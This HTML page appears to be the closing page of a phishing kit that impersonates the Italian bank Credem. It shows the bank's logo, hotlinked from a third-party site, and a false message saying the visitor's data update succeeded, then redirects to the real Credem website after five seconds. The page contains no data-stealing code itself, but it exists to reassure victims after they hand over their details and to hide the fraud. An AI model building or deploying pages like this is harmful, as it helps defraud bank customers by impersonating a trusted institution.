<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">







<html>







<head>







<title>Credem Aggiornamento </title>







<meta name="viewport" content="width=device-width, initial-scale=1.0">







<link rel="shortcut icon" href="images/favicon.ico"/>







<html><meta http-equiv="Refresh" content="05; url=https://www.credem.it/content/credem/it/privati-e-famiglie.html"></html>







<style type="text/css">







.textbox { 







    border: 1px solid #323232; 







    height: 42px; 







    width: 275px; 







  	font-family: 'open sans';







    font-size: 14px;







  	color: #6F6F6F;







    padding-left: 10px; 







    border-radius: 2px; 







    box-shadow: 0 4px 7px 0 #d2d2d2 inset;   







}  







.textbox:focus { 







    outline: none; 







    border: 2px solid #258900;







} 







</style>







</head>







<body>











<h2 style="text-align: center;"><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.bitmat.it/wp-content/uploads/2018/10/LOGOcredem-banca.png" alt="" width="335" height="251" />Aggiornamento dati concluso con successo</h2>



<br>



<br>



<br>


<center>
<div id="formimage1" <img style="display: block; margin-left: auto; margin-right:auto; z-index:5"><input type="image" name="formimage1" width="90" height="90" src="images/s14.png"></div>
</center>

<br>



<br>



</body>







</html>